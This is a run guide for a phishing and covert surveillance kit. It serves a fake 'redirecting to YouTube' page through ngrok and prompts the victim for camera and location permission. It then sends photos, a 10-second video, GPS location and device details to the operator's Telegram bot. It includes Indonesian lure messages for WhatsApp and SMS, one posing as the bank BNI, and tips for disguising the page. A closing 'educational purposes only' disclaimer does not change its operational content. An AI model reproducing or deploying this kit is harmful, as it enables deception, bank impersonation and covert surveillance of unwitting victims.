# 🚀 Bank Transfer Verification - Launch Guide
**100% FREE - No Deployment - Python Terminal Only**

## 📋 PREREQUISITES

### 1. **Install Python Dependencies**
```bash
cd d:\HACKING\transaksi-transfer-bank
pip install -r requirements.txt
```

### 2. **Install Ngrok (MUST HAVE)**
**Windows:**
```bash
# Download from https://ngrok.com/download
# OR via Chocolatey:
choco install ngrok

# OR via npm:
npm install -g ngrok
```

**Linux/Mac:**
```bash
# Download binary or
brew install ngrok  # Mac
# OR
npm install -g ngrok
```

### 3. **Setup Telegram Bot (Optional but Recommended)**
1. Create bot via @BotFather on Telegram
2. Get `TELEGRAM_BOT_TOKEN`
3. Get your `TELEGRAM_CHAT_ID` from `getUpdates`
4. Create `.env.local` file:
```env
TELEGRAM_BOT_TOKEN=your_bot_token_here
TELEGRAM_CHAT_ID=your_chat_id_here
```

## 🚀 HOW TO RUN

### **Method 1: Simple Start**
```bash
cd d:\HACKING\transaksi-transfer-bank
python launcher.py
```

### **Method 2: With Custom Config**
Edit `launcher.py` section `CONFIG`:
```python
CONFIG = {
    "fake_port": 8080,
    "fake_title": "YouTube",
    "fake_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
    "fake_delay": 3,  # Change delay time
    "show_qr": True,  # Show QR code
    "auto_open_browser": False
}
```

## 🔗 WHAT HAPPENS WHEN YOU RUN

```
1. ✅ Fake YouTube server starts (port 8080)
2. ✅ Next.js app starts (port 3000) 
3. ✅ Ngrok tunnel creates PUBLIC URL
4. ✅ QR code generated (scan with phone)
5. ✅ System ready - Link displayed
```

## 📱 TARGET EXPERIENCE

**Target receives link:** `https://abc123.ngrok.io`

**What target sees:**
```
1. "Redirecting to YouTube..." (fake page)
2. 3 second countdown with YouTube logo
3. Verification app appears (seamless transition)
4. Clicks anywhere → Camera/location permission
5. Page unblurs (looks successful)
6. Countdown 5 seconds
7. Redirects to REAL YouTube video
```

**Target thinks:** "Oh, just a YouTube link that needed verification"

## 🎯 HOW TO USE

### **Step 1: Start the System**
```bash
python launcher.py
```

### **Step 2: Get Public Link**
System will display:
```
🌐 Public URL: https://abc123.ngrok.io
📱 SCAN QR CODE TO OPEN LINK ON PHONE
```

### **Step 3: Send to Target**
**Via WhatsApp:**
```
"Bang, bukti transfer: https://abc123.ngrok.io
Ini link verifikasi buat keamanan transaksi."
```

**Via SMS:**
```
"BNI: Transfer Anda berhasil. Verifikasi: https://abc123.ngrok.io"
```

### **Step 4: Monitor Results**
1. Keep Python terminal running
2. Data will be sent to your Telegram bot
3. Includes: Photo, 10s video, location, device info

## ⚙️ CUSTOMIZATION

### **Change Redirect Destination**
Edit in `launcher.py`:
```python
"fake_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
```
Change to:
- News: `"https://www.kompas.com"`
- Social: `"https://twitter.com"`
- Bank: `"https://bni.co.id"`

### **Change Fake Page Design**
Edit `FakeLandingHandler` class in `launcher.py`:
- Change logo, colors, text
- Add different platform (Twitter, Instagram, etc.)

### **No Ngrok Alternative**
Set in `launcher.py`:
```python
"use_ngrok": False,
```
Then use `localtunnel`:
```bash
npm install -g localtunnel
npx lt --port 8080 --subdomain mybank
```

## 🛠️ TROUBLESHOOTING

### **Ngrok Not Found**
```bash
# Download manually from ngrok.com
# Add to PATH or place in project folder
```

### **Port Already in Use**
Edit `launcher.py`:
```python
"fake_port": 8081,  # Change port
"app_port": 3001,   # Change port
```

### **Telegram Data Not Sending**
1. Check `.env.local` file exists
2. Verify token and chat ID are correct
3. Start conversation with bot first
4. Test manually:
```bash
curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=test"
```

### **Camera Not Working**
- Must use HTTPS (ngrok provides this)
- Browser may block autoplay (still redirects)
- User must click to activate camera

## 🔒 SECURITY NOTES

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**
- Browser always asks permission first
- User can deny camera/location access
- HTTPS required by browsers
- Data only sent to YOUR Telegram bot
- No data stored on server

## 📁 PROJECT STRUCTURE

```
transaksi-transfer-bank/
├── launcher.py          # Main Python launcher
├── requirements.txt     # Python dependencies
├── RUN_GUIDE.md        # This file
├── REDIRECT_CONFIG.md  # Redirect configuration
├── src/                # Next.js app
├── public/             # Static files
└── package.json        # Node.js dependencies
```

## 🎮 QUICK COMMANDS

```bash
# Start everything
python launcher.py

# Install dependencies
pip install -r requirements.txt
npm install

# Test ngrok only
ngrok http 8080

# Test Next.js only
npm run dev

# Check Telegram config
type .env.local
```

## 🆘 NEED HELP?

1. **Ngrok issues**: https://ngrok.com/docs
2. **Telegram bot**: https://core.telegram.org/bots
3. **Next.js errors**: Check browser console
4. **Python errors**: Check launcher.py config

---

**🚀 READY TO LAUNCH?**
```bash
cd d:\HACKING\transaksi-transfer-bank
python launcher.py
```

Send the generated link to target and monitor Telegram for data! 🎯